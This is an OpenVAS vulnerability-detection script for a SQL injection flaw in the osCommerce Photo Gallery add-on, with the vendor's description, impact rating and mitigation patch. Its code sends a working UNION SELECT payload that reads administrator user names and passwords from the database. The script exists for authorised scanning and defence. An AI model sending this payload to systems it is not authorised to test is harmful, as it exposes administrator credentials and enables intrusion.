###############################################################################
# OpenVAS Vulnerability Test
# $Id: osc_photoGallery_sql_injection.nasl 14031 2019-03-07 10:47:29Z cfischer $
#
# osCommerce Photo Gallery SQL-Injection Detection
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100000");
  script_version("$Revision: 14031 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-07 11:47:29 +0100 (Thu, 07 Mar 2019) $");
  script_tag(name:"creation_date", value:"2009-02-20 17:40:17 +0100 (Fri, 20 Feb 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("osCommerce Photo Gallery SQL Injection Vulnerability");
  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("oscommerce_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Software/osCommerce");

  script_tag(name:"impact", value:"Successful exploitation will allow the attacker to access the whole Database.");

  script_tag(name:"affected", value:"Photo Gallery <= version 0.6.");

  script_tag(name:"insight", value:"Input passed to the parameters in gallery_process.php are not properly
  sanitised before being used in the SQL queries.");

  script_tag(name:"solution", value:"Edit gallery_process.php and change all occurrences of $_GET['cID'] to (int)$_GET['cID']
  and all occurrences of $_GET['pID'] to (int)$_GET['pID']. Then, at the top of gallery_process php,
  search for:

  require('includes/application_top.php')<comma>

  require(DIR_WS_LANGUAGES . $language . '/gallery_user.php')<comma>

  and change to:

  require('includes/application_top.php')<comma>

  if (!tep_session_is_registered('customer_id')) {

    tep_redirect(tep_href_link(FILENAME_LOGIN, '', 'SSL'))<comma>

  }

  require(DIR_WS_LANGUAGES . $language . '/gallery_user.php')<comma>");

  script_tag(name:"summary", value:"This host is running Photo Gallery for osCommerce which is prone to SQL Injection vulnerability in
  gallery_process.php.");

  script_tag(name:"solution_type", value:"Mitigation");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

CPE = 'cpe:/a:oscommerce:oscommerce';

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

url = string(dir, "/gallery_process.php?edit=yes&pID=0%20union%20select%20user_name%20as%20title,%20user_password%20as%20description%20from%20administrators%20&cID=0");
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if(!buf)
  exit(0);

if(egrep(pattern:".*union select.*", string: buf) ||
   egrep(pattern:".*Table.*administrators.*doesn't exist.*", string: buf)) { # old versions of osc doesn't have table administrators
  report = report_vuln_url( port:port, url:url );
  security_message(port:port, data:report);
  exit(0);
}

exit(99);